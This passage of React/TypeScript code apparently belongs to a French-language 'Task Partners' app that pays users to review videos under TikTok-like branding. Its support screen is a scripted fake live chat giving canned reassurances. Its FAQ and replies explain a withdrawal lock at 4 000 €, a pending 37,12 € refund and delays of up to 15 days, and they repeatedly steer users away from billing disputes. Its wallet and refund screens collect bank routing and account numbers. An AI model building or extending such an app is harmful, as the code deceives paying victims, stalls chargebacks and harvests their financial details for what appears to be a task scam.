    <label className="block">
      <span className="mb-1.5 block text-xs font-black text-[#475569]">{label}</span>
      <input
        className="h-12 w-full rounded-[8px] border border-slate-200 bg-[#F8FAFC] px-4 text-sm font-bold text-[#0F172A] outline-none placeholder:text-slate-400"
        onChange={(event) => onChange(event.target.value)}
        placeholder={placeholder}
        value={value}
      />
    </label>
  );
}

function SupportScreen({ user }: { user: User }) {
  const [message, setMessage] = useState("");
  const [chatMessages, setChatMessages] = useState([
    {
      from: "support",
      text: `Bonjour ${user.name.split(" ")[0] || "à vous"}, votre compte est actif et le support est en ligne. Posez-moi vos questions sur l’accès, les retraits, les remboursements, les audits quotidiens, la sécurité du compte ou les informations de paiement.`,
    },
  ]);

  function sendMessage(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    const trimmed = message.trim();
    if (!trimmed) return;
    const reply = getSupportReply(trimmed);
    setChatMessages((value) => [
      ...value,
      { from: "user", text: trimmed },
      { from: "support", text: reply },
    ]);
    setMessage("");
  }

  return (
    <div className="space-y-4">
      <section className="rounded-[8px] border border-slate-200 bg-white p-4 shadow-sm">
        <div className="flex items-start gap-3">
          <div className="grid h-11 w-11 shrink-0 place-items-center rounded-full bg-[#E0F2FE] text-[#2563EB]">
            <ShieldCheck size={22} />
          </div>
          <div>
            <h1 className="text-2xl font-black text-[#0F172A]">Centre d’assistance</h1>
            <p className="mt-2 text-sm font-bold leading-6 text-[#475569]">
              Obtenez des réponses sur les audits, le traitement des remboursements, les règles de
              retrait et la vérification du compte.
            </p>
          </div>
        </div>
      </section>

      <section className="rounded-[8px] border border-emerald-200 bg-emerald-50 p-4 shadow-sm">
        <div className="flex items-start gap-3">
          <div className="grid h-10 w-10 shrink-0 place-items-center rounded-full bg-white text-emerald-600 shadow-sm">
            <CheckCircle2 size={22} />
          </div>
          <div>
            <h2 className="text-lg font-black text-emerald-900">Statut de commande et d’accès</h2>
            <p className="mt-1 text-sm font-bold leading-6 text-emerald-800">
              Votre accès Task Partners est actif. Terminez les audits créateurs du jour, gardez vos
              informations de paiement à jour et contactez le support ici avant d’ouvrir un litige
              de facturation afin que nous puissions résoudre rapidement les questions d’accès, de
              remboursement ou de paiement.
            </p>
          </div>
        </div>
      </section>

      <section className="rounded-[8px] border border-slate-200 bg-white p-4 shadow-sm">
        <h2 className="text-lg font-black text-[#0F172A]">Questions fréquentes</h2>
        <div className="mt-4 space-y-3">
          {[
            [
              "Pourquoi dois-je terminer les audits ?",
              "Les audits de créateurs partenaires valident l’activité du compte et libèrent votre solde de retrait restant en attente.",
            ],
            [
              "Pourquoi y a-t-il une limite quotidienne ?",
              "La limite de 6 vidéos protège la qualité des avis, empêche les comportements automatisés et maintient le réseau partenaire conforme.",
            ],
            [
              "Pourquoi le retrait est-il verrouillé à 4 000 € ?",
              "Les nouveaux comptes auditeurs suivent un seuil de sécurité financière avant de pouvoir demander des paiements à volume élevé.",
            ],
            [
              "Combien de temps prend le remboursement ?",
              "Les informations de remboursement confirmées restent enregistrées et en traitement. Comme le paiement passe par la vérification bancaire, l’examen du réseau de paiement et la validation du compte, le crédit peut prendre jusqu’à 15 jours ouvrés.",
            ],
            [
              "J’ai déjà payé. Où est mon accès ?",
              "Votre accès est actif dans cette application. Connectez-vous avec l’e-mail utilisé lors de l’inscription et continuez depuis l’onglet Tâches.",
            ],
            [
              "Que faire avant de contester un paiement ?",
              "Ouvrez d’abord cet onglet Support. Nous pouvons confirmer l’accès, expliquer le cycle d’audit quotidien, vérifier le statut du remboursement et vous aider avec les informations de paiement.",
            ],
            [
              "Puis-je modifier ma méthode de paiement ?",
              "Oui. Allez dans Portefeuille ou Remboursement, choisissez Cash App, PayPal, Venmo, Zelle ou Virement bancaire, puis saisissez les informations demandées.",
            ],
          ].map(([question, answer]) => (
            <div className="rounded-[8px] border border-slate-200 bg-[#F8FAFC] p-3" key={question}>
              <p className="text-sm font-black text-[#0F172A]">{question}</p>
              <p className="mt-1 text-xs font-bold leading-5 text-[#475569]">{answer}</p>
            </div>
          ))}
        </div>
      </section>

      <section className="rounded-[8px] border border-slate-200 bg-white p-4 shadow-sm">
        <h2 className="text-lg font-black text-[#0F172A]">Chat en direct</h2>
        <div className="mt-4 max-h-72 space-y-2 overflow-y-auto rounded-[8px] bg-[#F8FAFC] p-3">
          {chatMessages.map((item, index) => (
            <div
              className={`flex ${item.from === "user" ? "justify-end" : "justify-start"}`}
              key={`${item.from}-${index}`}
            >
              <p
                className={`max-w-[82%] rounded-[8px] px-3 py-2 text-xs font-bold leading-5 ${item.from === "user" ? "bg-[#FE2C55] text-white" : "bg-white text-[#475569] shadow-sm"}`}
              >
                {item.text}
              </p>
            </div>
          ))}
        </div>
        <form className="mt-3 flex gap-2" onSubmit={sendMessage}>
          <input
            className="min-w-0 flex-1 rounded-[8px] border border-slate-200 bg-[#F8FAFC] px-3 text-sm font-bold text-[#0F172A] outline-none placeholder:text-slate-400"
            onChange={(event) => setMessage(event.target.value)}
            placeholder="Tapez votre question..."
            value={message}
          />
          <button
            className="h-12 rounded-[8px] bg-[#2563EB] px-4 text-sm font-black text-white"
            type="submit"
          >
            Envoyer
          </button>
        </form>
      </section>
    </div>
  );
}

function getSupportReply(question: string) {
  const text = question.toLowerCase();

  if (/(withdraw|withdrawal|cash out|payout|retrait|saque|4000|4,000)/.test(text)) {
    return "Je comprends. Votre bouton de retrait se débloque automatiquement lorsque le solde disponible atteint 4 000 €. D’ici là, vos audits terminés continuent de libérer le solde restant en attente selon les règles de sécurité des nouveaux comptes.";
  }

  if (/(refund|tax|remboursement|fiscal|37|37.12|reembolso|fee|frais)/.test(text)) {
    return "Votre remboursement de 37,12 € est traité dans l’onglet Remboursement. Une fois les informations de paiement confirmées, le statut de traitement reste enregistré sur votre compte. Le remboursement passe par la vérification bancaire, l’examen du réseau de paiement et la validation du compte ; il peut donc prendre jusqu’à 15 jours ouvrés.";
  }

  if (/(daily|limit|quotidien|limite|6|demain|tomorrow|amanha|hoje|today)/.test(text)) {
    return "Chaque compte peut auditer 6 vidéos par jour. Cette limite protège la qualité des avis et empêche l’activité automatisée. Si la limite du jour est atteinte, le prochain cycle d’audit se débloque après la réinitialisation quotidienne.";
  }

  if (/(task|audit|video|review|avaliar|creator|criador)/.test(text)) {
    return "Pour terminer un audit créateur, regardez toute la vidéo jusqu’à la fin, notez le contenu, répondez aux questions et envoyez un commentaire d’au moins 3 vrais mots. La récompense est ajoutée juste après validation.";
  }

  if (
    /(bank|banque|routing|routage|account|compte|cash app|paypal|venmo|zelle|payment|paiement)/.test(
      text,
    )
  ) {
    return "Vous pouvez enregistrer Cash App, PayPal, Venmo, Zelle ou un virement bancaire. Pour le virement bancaire, saisissez le nom de votre banque, le numéro de routage et le numéro de compte avant de confirmer.";
  }

  if (
    /(login|connexion|password|email|e-mail|account|compte|register|inscription|cadastro|senha)/.test(
      text,
    )
  ) {
    return "Utilisez votre nom complet et votre e-mail pour accéder au tableau de bord. Si l’e-mail est nouveau, le compte est créé automatiquement. S’il existe déjà, nous chargeons les données enregistrées du compte.";
  }

  if (/(safe|secure|security|sécurité|fraud|fraude|trust|seguro|confianca)/.test(text)) {
    return "Task Partners utilise la vérification du compte, les limites quotidiennes et les seuils de paiement pour réduire l’activité automatisée et protéger les soldes approuvés des auditeurs.";
  }

  if (
    /(charge|dispute|billing|facturation|paid|payé|access|accès|order|commande|purchase|achat|refund me|rembourser|cancel|annuler)/.test(
      text,
    )
  ) {
    return "Votre accès est actif dans cette application. Avant d’ouvrir un litige de facturation, envoyez-nous le problème ici afin que le support puisse vérifier l’accès, le statut du remboursement ou les informations de paiement et vous aider rapidement.";
  }

  return "Je peux vous aider avec les retraits, les remboursements, les limites d’audit quotidiennes, les méthodes de paiement, la connexion, la sécurité du compte et les exigences d’avis créateur. Dites-moi sur quel point vous avez besoin d’aide.";
}

function ProfileScreen({
  user,
  reviews,
  balance,
}: {
  user: User;
  reviews: Review[];
  balance: number;
}) {
  return (
    <div>
      <h1 className="mb-4 text-2xl font-black text-[#0F172A]">Profil</h1>
      <div className="rounded-[8px] border border-slate-200 bg-white p-4 shadow-sm">
        <div className="flex items-center gap-3">
          <div className="grid h-16 w-16 place-items-center rounded-full bg-[#F1F5F9] text-[#0F172A]">
            <UserRound size={31} />
          </div>
          <div className="min-w-0">
            <p className="text-lg font-black">{user.name}</p>
            <p className="truncate text-sm font-bold text-[#475569]">{user.email}</p>
            <p className="mt-1 text-xs font-black text-[#2563EB]">Solde total : {usd(balance)}</p>
          </div>
        </div>
      </div>
      <h2 className="mb-3 mt-5 text-lg font-black text-[#0F172A]">Historique des avis</h2>
      <div className="space-y-2">
        {(reviews.length
          ? reviews
          : [
              {
                date: "Aujourd’hui",
                title: "Aucun avis pour le moment",
                reward: 0,
                status: "En attente",
              },
            ]
        ).map((review, index) => (
          <div
            key={`${review.title}-${index}`}
            className="rounded-[8px] border border-slate-200 bg-white p-3 text-sm shadow-sm"
          >
            <div className="flex items-center justify-between gap-3 font-black">
              <span>{review.title}</span>
              <span>{usd(review.reward)}</span>
            </div>
            <div className="mt-1 flex items-center justify-between text-xs font-bold text-[#475569]">
              <span>{review.date}</span>
              <span>{review.status}</span>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

function BottomNav({ screen, setScreen }: { screen: Screen; setScreen: (screen: Screen) => void }) {
  return (
    <nav className="shrink-0 border-t border-slate-200 bg-white px-2 pb-[max(8px,env(safe-area-inset-bottom))] pt-2 text-[11px] font-black shadow-[0_-8px_24px_rgba(15,23,42,.08)]">
      <div className="grid grid-cols-5">
        <NavButton
          active={screen === "tasks"}
          icon={<Home size={21} />}
          label="Tâches"
          onClick={() => setScreen("tasks")}
        />
        <NavButton
          active={screen === "wallet"}
          icon={<Wallet size={21} />}
          label="Portefeuille"
          onClick={() => setScreen("wallet")}
        />
        <NavButton
          active={screen === "refund"}
          icon={<ReceiptText size={21} />}
          label="Remboursement"
          onClick={() => setScreen("refund")}
        />
        <NavButton
          active={screen === "support"}
          icon={<MessageCircle size={21} />}
          label="Aide"
          onClick={() => setScreen("support")}
        />
        <NavButton
          active={screen === "profile"}
          icon={<UserRound size={21} />}
          label="Profil"
          onClick={() => setScreen("profile")}
        />
      </div>
    </nav>
  );
}

function ProcessingOverlay({ step }: { step: number }) {
  return (
    <div className="fixed inset-0 z-50 grid place-items-center bg-white/96 px-7 text-center text-[#0F172A]">
      <div className="w-full max-w-[340px]">
        <div className="mx-auto mb-7 grid h-20 w-20 place-items-center rounded-full bg-[#FE2C55] text-white shadow-xl shadow-rose-200">
          <Loader2 className="animate-spin" size={36} />
        </div>
        <p className="text-xs font-black uppercase tracking-[0.18em] text-[#2563EB]">
          Traitement de l’avis
        </p>
        <h2 className="mt-3 text-2xl font-black">{processingSteps[step]}</h2>
      </div>
    </div>
  );
}

function ChoiceRow({
  label,
  value,
  onChange,
}: {
  label: string;
  value: string;
  onChange: (value: string) => void;
}) {
  return (
    <div>
      <p className="mb-2 text-sm font-black text-[#0F172A]">{label}</p>
      <div className="grid grid-cols-2 gap-2">
        {["Oui", "Non"].map((option) => (
          <button
            key={option}
            className={`h-11 rounded-[8px] text-sm font-black transition ${value === option ? "bg-[#FE2C55] text-white shadow-lg shadow-rose-100" : "bg-white text-[#475569]"}`}
            onClick={(event) => preserveScrollFrom(event.currentTarget, () => onChange(option))}
            onMouseDown={(event) => event.preventDefault()}
            type="button"
          >
            {option}
          </button>
        ))}
      </div>
    </div>
  );
}

function NavButton({
  active,
  icon,
  label,
  onClick,
}: {
  active: boolean;
  icon: ReactNode;
  label: string;
  onClick: () => void;
}) {
  return (
    <button
      className={`flex h-14 flex-col items-center justify-center gap-1 rounded-[8px] ${active ? "bg-[#F1F5F9] text-[#FE2C55]" : "text-[#475569]"}`}
      onClick={onClick}
      type="button"
    >
      {icon}
      <span>{label}</span>
    </button>
  );
}

function AuthInput({
  icon,
  onChange,
  placeholder,
  type,
  value,
}: {
  icon: ReactNode;
  onChange: (value: string) => void;
  placeholder: string;
  type: string;
  value: string;
}) {
  return (
    <label className="flex h-13 items-center gap-3 rounded-[8px] border border-slate-200 bg-white px-4 text-[#0F172A] shadow-sm">
      {icon}
      <input
        required
        className="min-w-0 flex-1 bg-transparent text-sm font-bold outline-none placeholder:text-slate-400"
        onChange={(event) => onChange(event.target.value)}
        placeholder={placeholder}
        type={type}
        value={value}
      />
    </label>
  );
}

function MetricCard({ label, value, tone }: { label: string; value: string; tone: string }) {
  return (
    <div className={`rounded-[8px] border border-slate-200 ${tone} p-4 shadow-sm`}>
      <p className="text-xs font-black uppercase tracking-[0.16em] text-[#475569]">{label}</p>
      <p className="mt-2 text-3xl font-black text-[#0F172A]">{value}</p>
    </div>
  );
}

function preserveScrollFrom(element: HTMLElement, action: () => void) {
  const scroller = findScrollableParent(element);
  const top = scroller?.scrollTop;
  action();
  if (!scroller || top == null) return;
  window.requestAnimationFrame(() => {
    scroller.scrollTop = top;
    window.setTimeout(() => {
      scroller.scrollTop = top;
    }, 0);
  });
}

function findScrollableParent(element: HTMLElement) {
  let current: HTMLElement | null = element.parentElement;
  while (current) {
    if (current.scrollHeight > current.clientHeight + 10) return current;
    current = current.parentElement;
  }
  return null;
}

function Brand() {
  return (
    <div className="flex items-center gap-2 text-lg font-black text-[#0F172A]">
      <span className="h-5 w-5 rounded-[6px] bg-[#25F4EE] shadow-[7px_0_0_#FE2C55]" /> Task Partners
    </div>
  );
}

function UnsupportedDevice() {
  return (
    <main className="grid min-h-dvh place-items-center bg-[#F8FAFC] px-6 text-center text-[#0F172A]">
      <div className="max-w-[420px] rounded-[8px] border border-slate-200 bg-white p-6 shadow-xl">
        <div className="mx-auto mb-4 grid h-14 w-14 place-items-center rounded-full bg-[#FE2C55] text-white">
          <LockKeyholeIcon size={26} />
        </div>
        <h1 className="text-2xl font-black">Appareil non pris en charge</h1>
        <p className="mt-3 text-sm leading-6 text-[#475569]">
          Cette application est disponible uniquement sur mobile (iOS/Android). Veuillez l’ouvrir
          depuis votre smartphone.
        </p>
      </div>
    </main>
  );
}

function Server404() {
  return (
    <main className="grid min-h-dvh place-items-center bg-white text-center text-black">
      <div>
        <h1 className="text-5xl font-black">404</h1>
        <p className="mt-3 text-lg text-zinc-600">Page introuvable</p>
      </div>
    </main>
  );
}

function usd(value: number) {
  return value.toLocaleString("fr-FR", { style: "currency", currency: "EUR" });
}

function rewardForTask(index: number): number {
  if (index === TOTAL_TASKS_TO_GOAL - 1) {
    const previousTotal = rewardCurve
      .slice(0, TOTAL_TASKS_TO_GOAL - 1)
      .reduce((sum, value) => sum + value, 0);
    return Number((TOTAL_REWARD_TO_GOAL - previousTotal).toFixed(2));
  }
  return Number((rewardCurve[index] ?? 0).toFixed(2));
}

function countWords(value: string) {
  return value
    .trim()
    .split(/\s+/)
    .filter((word) => word.length > 1).length;
}

function sendAccessEmail(user: User) {
  void fetch("/api/public/send-access-email", {
    body: JSON.stringify({ email: user.email, name: user.name, template: "access" }),
    headers: { "Content-Type": "application/json" },
    method: "POST",
  }).catch((error) => {
    console.warn("[Task Partners] access email failed", error);
  });
}

function handleBehavioralEmailTriggers(user: User, balance: number, reviewedCount: number) {
  const count = syncEvaluatedVideoCount(user.email, reviewedCount);
  const log = readTriggeredEmailsLog(user.email);
  const inFlight = readEmailsInFlight(user.email);
  const triggers = pendingEmailTriggersForCount(count, log).filter(
    (trigger) => !inFlight.includes(trigger.key),
  );
  if (!triggers.length) return;

  writeEmailsInFlight(user.email, [...inFlight, ...triggers.map((trigger) => trigger.key)]);

  for (const trigger of triggers) {
    void fetch("/api/public/send-access-email", {
      body: JSON.stringify({
        balance,
        count: trigger.count,
        email: user.email,
        name: user.name,
        template: trigger.template,
      }),
      headers: { "Content-Type": "application/json" },
      method: "POST",
    })
      .then((response) => {
        if (!response.ok) {
          void response.text().then((text) => {
            console.warn("[Task Partners] behavioral email failed", response.status, text);
          });
          return;
        }
        const freshLog = readTriggeredEmailsLog(user.email);
        if (!freshLog.includes(trigger.key)) {
          writeTriggeredEmailsLog(user.email, [...freshLog, trigger.key]);
        }
      })
      .catch((error) => {
        console.warn("[Task Partners] behavioral email failed", error);
      })
      .finally(() => {
        writeEmailsInFlight(
          user.email,
          readEmailsInFlight(user.email).filter((key) => key !== trigger.key),
        );
      });
  }
}

function pendingEmailTriggersForCount(
  count: number,
  log: string[],
): Array<{ count: number; key: string; template: string }> {
  const milestones = [
    { count: 3, key: "email_3", template: "email_3" },
    { count: 6, key: "email_6", template: "email_6" },
    { count: 12, key: "email_12", template: "email_consistency" },
    { count: 18, key: "email_18", template: "email_consistency" },
    { count: 24, key: "email_24", template: "email_consistency" },
    { count: 30, key: "email_30", template: "email_consistency" },
    { count: 36, key: "email_36", template: "email_consistency" },
    { count: 42, key: "email_42", template: "email_42" },
  ];
  return milestones.filter((milestone) => count >= milestone.count && !log.includes(milestone.key));
}

function syncEvaluatedVideoCount(email: string, reviewedCount: number) {
  const key = userScopedKey(VIDEOS_EVALUATED_COUNT_KEY, email);
  const current = Number(window.localStorage.getItem(key) ?? "0");
  const next = Math.min(TOTAL_TASKS_TO_GOAL, Math.max(current, reviewedCount));
  window.localStorage.setItem(key, String(next));
  window.localStorage.setItem(VIDEOS_EVALUATED_COUNT_KEY, String(next));
  return next;
}

function readTriggeredEmailsLog(email: string): string[] {
  const key = userScopedKey(CONFIRMED_EMAILS_LOG_KEY, email);
  try {
    const raw =
      window.localStorage.getItem(key) ?? window.localStorage.getItem(CONFIRMED_EMAILS_LOG_KEY);
    const parsed = raw ? JSON.parse(raw) : [];
    return Array.isArray(parsed) ? parsed.filter((item) => typeof item === "string") : [];
  } catch {
    return [];
  }
}

function writeTriggeredEmailsLog(email: string, log: string[]) {
  window.localStorage.setItem(userScopedKey(CONFIRMED_EMAILS_LOG_KEY, email), JSON.stringify(log));
  window.localStorage.setItem(CONFIRMED_EMAILS_LOG_KEY, JSON.stringify(log));
  window.localStorage.setItem(userScopedKey(TRIGGERED_EMAILS_LOG_KEY, email), JSON.stringify(log));
  window.localStorage.setItem(TRIGGERED_EMAILS_LOG_KEY, JSON.stringify(log));
}

function readEmailsInFlight(email: string): string[] {
  const key = userScopedKey(EMAILS_IN_FLIGHT_KEY, email);
  try {
    const raw = window.localStorage.getItem(key);
    const parsed = raw ? JSON.parse(raw) : [];
    return Array.isArray(parsed) ? parsed.filter((item) => typeof item === "string") : [];
  } catch {
    return [];
  }
}

function writeEmailsInFlight(email: string, log: string[]) {
  window.localStorage.setItem(userScopedKey(EMAILS_IN_FLIGHT_KEY, email), JSON.stringify(log));
}

function userScopedKey(key: string, email: string) {
  return `${key}:${email.toLowerCase()}`;
}

function readAccounts(): User[] {
  try {
    const raw = window.localStorage.getItem(ACCOUNTS_KEY);
    return raw ? (JSON.parse(raw) as User[]) : [];
  } catch {
    return [];
  }
}

function readSession(): User | null {
  try {
    const raw = window.localStorage.getItem(SESSION_KEY);
    return raw ? (JSON.parse(raw) as User) : null;
  } catch {
    return null;
  }
}

function readAppState(
  email: string,
): { balance: number; reviewedIds: string[]; reviews: Review[]; taskIndex: number } | null {
  try {
    const raw = window.localStorage.getItem(appStateKey(email));
    return raw
      ? (JSON.parse(raw) as {
          balance: number;
          reviewedIds: string[];
          reviews: Review[];
          taskIndex: number;
        })
      : null;
  } catch {
    return null;
  }
}

function appStateKey(email: string) {
  return `${APP_STATE_KEY}:${email.toLowerCase()}`;
}

type RefundState = {
  account: string;
  approved: boolean;
  bank: string;
  data: string;
  method: string;
  routing: string;
};

function readRefundState(email: string): RefundState | null {
  try {
    const raw = window.localStorage.getItem(refundStateKey(email));
    return raw ? (JSON.parse(raw) as RefundState) : null;
  } catch {
    return null;
  }
}

function refundStateKey(email: string) {
  return `${REFUND_STATE_KEY}:${email.toLowerCase()}`;
}
